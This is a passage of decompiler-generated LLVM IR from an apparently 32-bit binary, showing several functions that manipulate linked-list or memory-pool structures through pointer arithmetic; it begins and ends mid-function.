  %v2_1000f1f0 = inttoptr i32 %v1_1000f1f0 to i32*
  %v3_1000f1f0 = load i32, i32* %v2_1000f1f0, align 4
  store i32 %v3_1000f1f0, i32* %r11.global-to-local, align 4
  %v3_1000f1f4 = icmp eq i32 %v3_1000f1f0, 0
  br i1 %v3_1000f1f4, label %dec_label_pc_1000f204, label %dec_label_pc_1000f1fc

dec_label_pc_1000f1fc:                            ; preds = %dec_label_pc_1000f1f0
  %v1_1000f1fc = add i32 %v0_1000f244, 8
  %v2_1000f1fc = inttoptr i32 %v1_1000f1fc to i32*
  %v3_1000f1fc = load i32, i32* %v2_1000f1fc, align 4
  %v2_1000f200 = add i32 %v3_1000f1f0, 8
  %v3_1000f200 = inttoptr i32 %v2_1000f200 to i32*
  store i32 %v3_1000f1fc, i32* %v3_1000f200, align 4
  %v0_1000f204.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000f220.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f204

dec_label_pc_1000f204:                            ; preds = %dec_label_pc_1000f1f0, %dec_label_pc_1000f1fc
  %v0_1000f220 = phi i32 [ %v2_1000f1d8, %dec_label_pc_1000f1f0 ], [ %v0_1000f220.pre, %dec_label_pc_1000f1fc ]
  %v0_1000f204 = phi i32 [ %v0_1000f244, %dec_label_pc_1000f1f0 ], [ %v0_1000f204.pre, %dec_label_pc_1000f1fc ]
  %v1_1000f204 = add i32 %v0_1000f204, 8
  %v2_1000f204 = inttoptr i32 %v1_1000f204 to i32*
  %v3_1000f204 = load i32, i32* %v2_1000f204, align 4
  %v1_1000f208 = add i32 %v0_1000f204, 4
  %v2_1000f208 = inttoptr i32 %v1_1000f208 to i32*
  %v3_1000f208 = load i32, i32* %v2_1000f208, align 4
  %v3_1000f20c = icmp eq i32 %v3_1000f204, 0
  store i32 %v0_1000f220, i32* %r11.global-to-local, align 4
  br i1 %v3_1000f20c, label %dec_label_pc_1000f220, label %dec_label_pc_1000f214

dec_label_pc_1000f214:                            ; preds = %dec_label_pc_1000f204
  %v2_1000f218 = add i32 %v3_1000f204, 4
  %v3_1000f218 = inttoptr i32 %v2_1000f218 to i32*
  store i32 %v3_1000f208, i32* %v3_1000f218, align 4
  br label %dec_label_pc_1000f234

dec_label_pc_1000f220:                            ; preds = %dec_label_pc_1000f204
  store i32 %v3_1000f208, i32* %arg1, align 4
  br label %dec_label_pc_1000f234

dec_label_pc_1000f22c:                            ; preds = %dec_label_pc_1000f1e4
  %v2_1000f22c = sub i32 %v2_1000f1d8, %v0_1000f22c
  store i32 %v2_1000f22c, i32* %v1_1000f1d8, align 4
  br label %dec_label_pc_1000f234

dec_label_pc_1000f234:                            ; preds = %dec_label_pc_1000f220, %dec_label_pc_1000f214, %dec_label_pc_1000f22c
  %v0_1000f234 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f234 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f234 = sub i32 %v1_1000f234, %v0_1000f234
  store i32 %v2_1000f234, i32* %r9.global-to-local, align 4
  %v0_1000f238 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000f238, i32* %v1_1000f1b8, align 4
  %v0_1000f23c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f23c = add i32 %v0_1000f23c, 12
  ret i32 %v1_1000f23c

dec_label_pc_1000f244:                            ; preds = %dec_label_pc_1000f1d8
  %v1_1000f244 = add i32 %v0_1000f244, 4
  %storemerge.in = inttoptr i32 %v1_1000f244 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000f248 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000f248, label %dec_label_pc_1000f248.dec_label_pc_1000f250_crit_edge, label %dec_label_pc_1000f1d8

dec_label_pc_1000f248.dec_label_pc_1000f250_crit_edge: ; preds = %dec_label_pc_1000f244
  br label %dec_label_pc_1000f250

dec_label_pc_1000f250:                            ; preds = %dec_label_pc_1000f248.dec_label_pc_1000f250_crit_edge, %dec_label_pc_1000f248.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000f204, { 1, 0 }
  uselistorder i32 %v2_1000f1d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000f244, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000f22c, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000f234, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f204, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f248.preheader, { 1, 0 }
}

define i32 @function_1000f258(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000f258:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000f258 = icmp eq i32 %arg3, 0
  %v2_1000f25c = add i32 %arg2, 4
  %v3_1000f25c = inttoptr i32 %v2_1000f25c to i32*
  store i32 %arg4, i32* %v3_1000f25c, align 4
  %v2_1000f260 = add i32 %arg2, 8
  %v3_1000f260 = inttoptr i32 %v2_1000f260 to i32*
  store i32 %arg3, i32* %v3_1000f260, align 4
  br i1 %v3_1000f258, label %dec_label_pc_1000f270, label %dec_label_pc_1000f268

dec_label_pc_1000f268:                            ; preds = %dec_label_pc_1000f258
  %v2_1000f268 = add i32 %arg3, 4
  %v3_1000f268 = inttoptr i32 %v2_1000f268 to i32*
  store i32 %arg2, i32* %v3_1000f268, align 4
  br label %dec_label_pc_1000f274

dec_label_pc_1000f270:                            ; preds = %dec_label_pc_1000f258
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000f274

dec_label_pc_1000f274:                            ; preds = %dec_label_pc_1000f268, %dec_label_pc_1000f270
  %v3_1000f274 = icmp eq i32 %arg4, 0
  %v0_1000f278 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f274, i32 %v0_1000f278)
  %v2_1000f27c = add i32 %arg4, 8
  %v3_1000f27c = inttoptr i32 %v2_1000f27c to i32*
  store i32 %arg2, i32* %v3_1000f27c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000f274, { 1, 0 }
}

define i32 @function_1000f284(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000f284:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000f284 = icmp eq i32 %arg3, 0
  br i1 %v3_1000f284, label %dec_label_pc_1000f294, label %dec_label_pc_1000f28c

dec_label_pc_1000f28c:                            ; preds = %dec_label_pc_1000f284
  %v2_1000f28c = add i32 %arg3, 4
  %v3_1000f28c = inttoptr i32 %v2_1000f28c to i32*
  store i32 %arg2, i32* %v3_1000f28c, align 4
  br label %dec_label_pc_1000f298

dec_label_pc_1000f294:                            ; preds = %dec_label_pc_1000f284
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000f298

dec_label_pc_1000f298:                            ; preds = %dec_label_pc_1000f28c, %dec_label_pc_1000f294
  %v2_1000f298 = add i32 %arg2, 8
  %v3_1000f298 = inttoptr i32 %v2_1000f298 to i32*
  store i32 %arg3, i32* %v3_1000f298, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f298, { 1, 0 }
}

define i32 @function_1000f2a0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000f2a0:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000f2b8 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f2b8, i32* @r31, align 4
  %v2_1000f2bc = add i32 %arg3, %arg2
  store i32 %v2_1000f2bc, i32* %r3.global-to-local, align 4
  %v3_1000f2d07 = icmp eq i32 %v2_1000f2b8, 0
  %v1_1000f2d48 = add i32 %v2_1000f2b8, 12
  %tmp69 = icmp uge i32 %v1_1000f2d48, %arg2
  %or.cond10 = or i1 %v3_1000f2d07, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000f2e0, label %dec_label_pc_1000f2c8

dec_label_pc_1000f2c8:                            ; preds = %dec_label_pc_1000f2a0, %dec_label_pc_1000f2c8
  %v0_1000f32811 = phi i32 [ %v3_1000f2cc, %dec_label_pc_1000f2c8 ], [ %v2_1000f2b8, %dec_label_pc_1000f2a0 ]
  store i32 %v0_1000f32811, i32* %r11.global-to-local, align 4
  %v1_1000f2cc = add i32 %v0_1000f32811, 4
  %v2_1000f2cc = inttoptr i32 %v1_1000f2cc to i32*
  %v3_1000f2cc = load i32, i32* %v2_1000f2cc, align 4
  store i32 %v3_1000f2cc, i32* @r31, align 4
  %v3_1000f2d0 = icmp eq i32 %v3_1000f2cc, 0
  %v1_1000f2d4 = add i32 %v3_1000f2cc, 12
  %tmp6 = icmp uge i32 %v1_1000f2d4, %arg2
  %or.cond = or i1 %v3_1000f2d0, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000f2e0, label %dec_label_pc_1000f2c8

dec_label_pc_1000f2e0:                            ; preds = %dec_label_pc_1000f2c8, %dec_label_pc_1000f2a0
  %v0_1000f31c.lcssa = phi i32 [ 0, %dec_label_pc_1000f2a0 ], [ %v0_1000f32811, %dec_label_pc_1000f2c8 ]
  %v0_1000f328.lcssa = phi i32 [ %v2_1000f2b8, %dec_label_pc_1000f2a0 ], [ %v3_1000f2cc, %dec_label_pc_1000f2c8 ]
  %v3_1000f2d0.lcssa = phi i1 [ %v3_1000f2d07, %dec_label_pc_1000f2a0 ], [ %v3_1000f2d0, %dec_label_pc_1000f2c8 ]
  br i1 %v3_1000f2d0.lcssa, label %dec_label_pc_1000f398, label %dec_label_pc_1000f2e8

dec_label_pc_1000f2e8:                            ; preds = %dec_label_pc_1000f2e0
  %v1_1000f2e8 = inttoptr i32 %v0_1000f328.lcssa to i32*
  %v2_1000f2e8 = load i32, i32* %v1_1000f2e8, align 4
  %v2_1000f2ec = sub i32 %v0_1000f328.lcssa, %v2_1000f2e8
  %v1_1000f2f0 = add i32 %v2_1000f2ec, 12
  %v3_1000f2f4 = icmp ugt i32 %v1_1000f2f0, %v2_1000f2bc
  br i1 %v3_1000f2f4, label %dec_label_pc_1000f398, label %dec_label_pc_1000f2fc

dec_label_pc_1000f2fc:                            ; preds = %dec_label_pc_1000f2e8
  %v4_1000f2f4 = icmp eq i32 %v1_1000f2f0, %v2_1000f2bc
  %v2_1000f300 = add i32 %v2_1000f2e8, %arg3
  store i32 %v2_1000f300, i32* @r29, align 4
  br i1 %v4_1000f2f4, label %dec_label_pc_1000f308, label %dec_label_pc_1000f338

dec_label_pc_1000f308:                            ; preds = %dec_label_pc_1000f2fc
  %v3_1000f308 = icmp eq i32 %v0_1000f31c.lcssa, 0
  br i1 %v3_1000f308, label %dec_label_pc_1000f38c, label %dec_label_pc_1000f310

dec_label_pc_1000f310:                            ; preds = %dec_label_pc_1000f308
  %v1_1000f310 = add i32 %v0_1000f31c.lcssa, 12
  %v4_1000f314 = icmp eq i32 %v1_1000f310, %arg2
  br i1 %v4_1000f314, label %dec_label_pc_1000f31c, label %dec_label_pc_1000f38c

dec_label_pc_1000f31c:                            ; preds = %dec_label_pc_1000f310
  %v1_1000f31c = inttoptr i32 %v0_1000f31c.lcssa to i32*
  %v2_1000f31c = load i32, i32* %v1_1000f31c, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000f324 = add i32 %v0_1000f31c.lcssa, 8
  %v2_1000f324 = inttoptr i32 %v1_1000f324 to i32*
  %v3_1000f324 = load i32, i32* %v2_1000f324, align 4
  %v2_1000f32c = add i32 %v2_1000f31c, %v2_1000f300
  store i32 %v2_1000f32c, i32* @r29, align 4
  %v5_1000f330 = call i32 @function_1000f284(i32* %arg1, i32 %v0_1000f328.lcssa, i32 %v3_1000f324, i32 %v2_1000f2bc)
  store i32 %v5_1000f330, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f38c

dec_label_pc_1000f338:                            ; preds = %dec_label_pc_1000f2fc
  %v1_1000f338 = add i32 %v0_1000f328.lcssa, 4
  %v2_1000f338 = inttoptr i32 %v1_1000f338 to i32*
  %v3_1000f338 = load i32, i32* %v2_1000f338, align 4
  %v3_1000f33c = icmp eq i32 %v3_1000f338, 0
  br i1 %v3_1000f33c, label %dec_label_pc_1000f374, label %dec_label_pc_1000f344

dec_label_pc_1000f344:                            ; preds = %dec_label_pc_1000f338
  %v1_1000f344 = inttoptr i32 %v3_1000f338 to i32*
  %v2_1000f344 = load i32, i32* %v1_1000f344, align 4
  %v2_1000f348 = sub i32 %v3_1000f338, %v2_1000f344
  %v1_1000f34c = add i32 %v2_1000f348, 12
  %v4_1000f350 = icmp eq i32 %v2_1000f2bc, %v1_1000f34c
  br i1 %v4_1000f350, label %dec_label_pc_1000f358, label %dec_label_pc_1000f374

dec_label_pc_1000f358:                            ; preds = %dec_label_pc_1000f344
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000f364 = add i32 %v2_1000f344, %v2_1000f300
  store i32 %v2_1000f364, i32* @r29, align 4
  store i32 %v3_1000f338, i32* @r31, align 4
  %v5_1000f36c = call i32 @function_1000f284(i32* %arg1, i32 %v3_1000f338, i32 %v0_1000f31c.lcssa, i32 %v2_1000f2bc)
  store i32 %v5_1000f36c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f38c

dec_label_pc_1000f374:                            ; preds = %dec_label_pc_1000f344, %dec_label_pc_1000f338
  %v2_1000f374 = add i32 %v0_1000f328.lcssa, %arg3
  store i32 %v2_1000f374, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268497804, i32* @lr, align 4
  %v5_1000f388 = call i32 @function_1000f258(i32* %arg1, i32 %v2_1000f374, i32 %v0_1000f31c.lcssa, i32 %v3_1000f338)
  store i32 %v5_1000f388, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f38c

dec_label_pc_1000f38c:                            ; preds = %dec_label_pc_1000f310, %dec_label_pc_1000f308, %dec_label_pc_1000f358, %dec_label_pc_1000f31c, %dec_label_pc_1000f374
  %v0_1000f38c = load i32, i32* @r31, align 4
  store i32 %v0_1000f38c, i32* @r30, align 4
  %v0_1000f390 = load i32, i32* @r29, align 4
  %v2_1000f390 = inttoptr i32 %v0_1000f38c to i32*
  store i32 %v0_1000f390, i32* %v2_1000f390, align 4
  br label %dec_label_pc_1000f3b4

dec_label_pc_1000f398:                            ; preds = %dec_label_pc_1000f2e8, %dec_label_pc_1000f2e0
  %v2_1000f398 = add i32 %v2_1000f2bc, -12
  %v3_1000f398 = inttoptr i32 %v2_1000f398 to i32*
  store i32 %arg3, i32* %v3_1000f398, align 4
  %v0_1000f39c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f39c = add i32 %v0_1000f39c, -12
  store i32 %v1_1000f39c, i32* @r30, align 4
  %v0_1000f3a0 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000f3a4 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f3a4, i32* %r3.global-to-local, align 4
  %v0_1000f3a8 = load i32, i32* @r31, align 4
  store i32 268497844, i32* @lr, align 4
  %v4_1000f3b0 = inttoptr i32 %v0_1000f3a4 to i32*
  %v5_1000f3b0 = call i32 @function_1000f258(i32* %v4_1000f3b0, i32 %v1_1000f39c, i32 %v0_1000f3a0, i32 %v0_1000f3a8)
  store i32 %v5_1000f3b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f3b4

dec_label_pc_1000f3b4:                            ; preds = %dec_label_pc_1000f38c, %dec_label_pc_1000f398
  %v0_1000f3b8 = load i32, i32* @r30, align 4
  store i32 %v0_1000f3b8, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f3b8

; uselistorder directives
  uselistorder i32 %v3_1000f338, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000f2f0, { 1, 0 }
  uselistorder i32 %v0_1000f328.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000f31c.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000f2cc, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000f2bc, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 10, 1, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000f3b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f38c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000f2c8, { 1, 0 }
}

define i32 @function_1000f3cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f3cc:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000f3e8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1002b7a0.768 to i32), i32* @r29, align 4
  store i32 %v2_1000f3e8, i32* @r3, align 4
  %v0_1000f3fc = call i32 @function_10010048()
  %v0_1000f404 = call i32 @function_10010040()
  %v2_1000f40c = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000f414 = call i32 @function_1000f6a8(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18504) to i32*), i32 %v2_1000f40c)
  store i32 %v2_1000f3e8, i32* @r3, align 4
  %v0_1000f420 = call i32 @function_10010048()
  %v3_1000f428 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000f428
}

define i32 @function_1000f43c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f43c:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002b7a0.768 to i32), i32* %r29.global-to-local, align 4
  %v2_1000f460 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000f460, i32* @r3, align 4
  %v0_1000f468 = call i32 @function_10010048()
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000f474 = call i32 @function_10010040()
  store i32 268498064, i32* @lr, align 4
  %v3_1000f48c = call i32 @function_1000f5b4(i32 %arg1, i32* nonnull @global_var_1002b7b8)
  %v1_1000f494 = icmp slt i32 %v3_1000f48c, 0
  store i32 %v2_1000f460, i32* @r3, align 4
  br i1 %v1_1000f494, label %dec_label_pc_1000f4a4, label %dec_label_pc_1000f4a0

dec_label_pc_1000f4a0:                            ; preds = %dec_label_pc_1000f43c
  store i32 ptrtoint (i32** @global_var_1002b7bc.772 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f4a4

dec_label_pc_1000f4a4:                            ; preds = %dec_label_pc_1000f43c, %dec_label_pc_1000f4a0
  %v0_1000f4a4 = call i32 @function_10010048()
  %v0_1000f4ac = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000f4ac

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f4a4, { 1, 0 }
}

define i32 @function_1000f4c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000f4c0:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000f4d0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000f4d0, i32* @r3, align 4
  %v0_1000f4f8 = call i32 @function_10010048()
  %v0_1000f500 = call i32 @function_10010040()
  store i32 %arg1, i32* @r3, align 4
  store i32 268498208, i32* @lr, align 4
  %v4_1000f51c = inttoptr i32 %arg1 to i32*
  %v5_1000f51c = call i32 @function_1000f81c(i32* %v4_1000f51c, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1002b7b8 to i32))
  store i32 %v2_1000f4d0, i32* @r3, align 4
  %v0_1000f528 = call i32 @function_10010048()
  ret i32 ptrtoint (i32** @global_var_1002b7bc.772 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1000f548(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f548:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000f560 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000f560, i32* @r3, align 4
  %v0_1000f578 = call i32 @function_10010048()
  %v0_1000f580 = call i32 @function_10010040()
  store i32 ptrtoint (i32* @global_var_1002b7b8 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268498324, i32* @lr, align 4
  %v0_1000f590 = call i32 @function_1000f738()
  store i32 %v2_1000f560, i32* @r3, align 4
  %v0_1000f59c = call i32 @function_10010048()
  ret i32 %v0_1000f59c

; uselistorder directives
  uselistorder i32* @global_var_1002b7b8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b7b8 to i32), { 1, 0 }
}

define i32 @function_1000f5b4(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1000f5b4:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000f5b4 = add i32 %tmp, 12
  %v2_1000f5b4 = inttoptr i32 %v1_1000f5b4 to i32*
  %v3_1000f5b4 = load i32, i32* %v2_1000f5b4, align 4
  store i32 %v3_1000f5b4, i32* %r11.global-to-local, align 4
  %v0_1000f5b8 = load i32, i32* @lr, align 4
  store i32 %v0_1000f5b8, i32* %r0.global-to-local, align 4
  %v1_1000f5c0 = add i32 %arg1, 4
  store i32 %v1_1000f5c0, i32* %r3.global-to-local, align 4
  %v1_1000f5c4 = add i32 %tmp, 8
  %v2_1000f5c4 = inttoptr i32 %v1_1000f5c4 to i32*
  %v3_1000f5c4 = load i32, i32* %v2_1000f5c4, align 4
  store i32 %v3_1000f5c4, i32* %r9.global-to-local, align 4
  %v3_1000f5c8 = icmp eq i32 %v3_1000f5b4, 0
  br i1 %v3_1000f5c8, label %dec_label_pc_1000f5d4, label %dec_label_pc_1000f5dc

dec_label_pc_1000f5d4:                            ; preds = %dec_label_pc_1000f5b4
  %v2_1000f5d4 = add i32 %v3_1000f5c4, -4
  %v3_1000f5d4 = inttoptr i32 %v2_1000f5d4 to i32*
  store i32 0, i32* %v3_1000f5d4, align 4
  br label %dec_label_pc_1000f5f4

dec_label_pc_1000f5dc:                            ; preds = %dec_label_pc_1000f5b4
  %v1_1000f5dc = add i32 %tmp, 4
  %v2_1000f5dc = inttoptr i32 %v1_1000f5dc to i32*
  %v3_1000f5dc = load i32, i32* %v2_1000f5dc, align 4
  %v2_1000f5e0 = sub i32 %v3_1000f5dc, %v3_1000f5c4
  %v4_1000f5e4 = sdiv i32 %v2_1000f5e0, 4
  %v1_1000f5e8 = mul i32 %v4_1000f5e4, 5
  %v2_1000f5ec = add i32 %v1_1000f5e8, %v3_1000f5b4
  store i32 %v2_1000f5ec, i32* %r0.global-to-local, align 4
  %v2_1000f5f0 = add i32 %v3_1000f5c4, -4
  %v3_1000f5f0 = inttoptr i32 %v2_1000f5f0 to i32*
  store i32 %v2_1000f5ec, i32* %v3_1000f5f0, align 4
  br label %dec_label_pc_1000f5f4

dec_label_pc_1000f5f4:                            ; preds = %dec_label_pc_1000f5d4, %dec_label_pc_1000f5dc
  %v0_1000f5f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f5f4 = add i32 %v0_1000f5f4, -4
  %v2_1000f5f4 = inttoptr i32 %v1_1000f5f4 to i32*
  %v3_1000f5f4 = load i32, i32* %v2_1000f5f4, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001a124.773 to i32), i32* %r9.global-to-local, align 4
  %v2_1000f608 = srem i32 %v3_1000f5f4, 5
  store i32 %v2_1000f608, i32* %r11.global-to-local, align 4
  %v2_1000f614 = icmp ugt i32 %v2_1000f608, 4
  %v1_1000f618 = mul nsw i32 %v2_1000f608, 4
  store i32 %v1_1000f618, i32* %r0.global-to-local, align 4
  %v2_1000f61c = add i32 %v1_1000f618, ptrtoint (i32* @global_var_1001a124.773 to i32)
  store i32 %v2_1000f61c, i32* %r10.global-to-local, align 4
  br i1 %v2_1000f614, label %dec_label_pc_1000f684, label %dec_label_pc_1000f628

dec_label_pc_1000f628:                            ; preds = %dec_label_pc_1000f5f4
  %v3_1000f620 = icmp eq i32 %v2_1000f608, 0
  %v1_1000f628 = add i32 %v1_1000f618, add (i32 ptrtoint (i32* @global_var_1001a124.773 to i32), i32 20)
  %v2_1000f628 = inttoptr i32 %v1_1000f628 to i32*
  %v3_1000f628 = load i32, i32* %v2_1000f628, align 4
  store i32 %v3_1000f628, i32* %r10.global-to-local, align 4
  %v3_1000f62c = inttoptr i32 %v2_1000f61c to i32*
  %v4_1000f62c = load i32, i32* %v3_1000f62c, align 4
  store i32 %v4_1000f62c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f608, i32* %v2_1000f5b4, align 4
  %v0_1000f634 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f634 = mul i32 %v0_1000f634, 4
  store i32 %v1_1000f634, i32* %r0.global-to-local, align 4
  %v2_1000f638 = add i32 %tmp, 16
  %v3_1000f638 = inttoptr i32 %v2_1000f638 to i32*
  store i32 %v0_1000f634, i32* %v3_1000f638, align 4
  %v0_1000f63c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f63c = add i32 %tmp, 20
  %v3_1000f63c = inttoptr i32 %v2_1000f63c to i32*
  store i32 %v0_1000f63c, i32* %v3_1000f63c, align 4
  %v0_1000f640 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f640 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f640 = add i32 %v1_1000f640, %v0_1000f640
  store i32 %v2_1000f640, i32* %r8.global-to-local, align 4
  br i1 %v3_1000f620, label %dec_label_pc_1000f678, label %dec_label_pc_1000f648

dec_label_pc_1000f648:                            ; preds = %dec_label_pc_1000f628
  %v1_1000f648 = add i32 %v0_1000f640, -4
  %v2_1000f648 = inttoptr i32 %v1_1000f648 to i32*
  %v3_1000f648 = load i32, i32* %v2_1000f648, align 4
  %v1_1000f64c = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f64c = sdiv i32 %v3_1000f648, %v1_1000f64c
  %v1_1000f650 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f650 = add i32 %v1_1000f650, %v2_1000f64c
  store i32 %v2_1000f650, i32* %r9.global-to-local, align 4
  %v1_1000f654 = mul i32 %v2_1000f64c, 4
  %v1_1000f658 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f658 = sdiv i32 %v2_1000f650, %v1_1000f658
  store i32 %v2_1000f658, i32* %r11.global-to-local, align 4
  %v2_1000f65c = add i32 %v1_1000f654, %v0_1000f640
  store i32 %v2_1000f65c, i32* %r0.global-to-local, align 4
  %v2_1000f660 = add i32 %tmp, 4
  %v3_1000f660 = inttoptr i32 %v2_1000f660 to i32*
  store i32 %v2_1000f65c, i32* %v3_1000f660, align 4
  %v0_1000f664 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f664 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f664 = mul i32 %v1_1000f664, %v0_1000f664
  store i32 %v2_1000f664, i32* %r11.global-to-local, align 4
  %v1_1000f668 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f668 = sub i32 %v1_1000f668, %v2_1000f664
  %v1_1000f66c = mul i32 %v2_1000f668, 4
  %v0_1000f670 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000f670 = add i32 %v1_1000f66c, %v0_1000f670
  store i32 %v2_1000f670, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f670, i32* %arg2, align 4
  %v0_1000f678.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f678

dec_label_pc_1000f678:                            ; preds = %dec_label_pc_1000f628, %dec_label_pc_1000f648
  %v0_1000f678 = phi i32 [ %v2_1000f640, %dec_label_pc_1000f628 ], [ %v0_1000f678.pre, %dec_label_pc_1000f648 ]
  %v2_1000f678 = add i32 %tmp, 24
  %v3_1000f678 = inttoptr i32 %v2_1000f678 to i32*
  store i32 %v0_1000f678, i32* %v3_1000f678, align 4
